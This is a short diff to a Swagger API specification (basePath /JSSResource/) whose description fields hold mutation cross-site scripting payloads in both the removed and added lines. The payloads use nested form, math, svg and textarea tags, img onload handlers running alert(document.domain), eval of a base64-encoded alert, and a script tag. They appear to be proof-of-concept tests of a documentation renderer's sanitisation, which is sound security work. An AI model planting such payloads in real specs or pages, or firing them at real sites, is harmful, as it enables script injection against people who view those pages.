@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=o onload=alert(document.domain) onload=eval(atob(YWxlcnQoMSk=)) ></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=o onload=alert(document.domain) error=eval(atob(YWxlcnQoMSk=)) ">><script>alert("s")</script></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=e onload=alert(document.domain) onload=eval(atob(YWxlcnQoMSk=)) >"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=e error=alert(document.domain) onload=eval(atob(YWxlcnQoMSk=)) >"></form>
 
           format: int64
           in: path
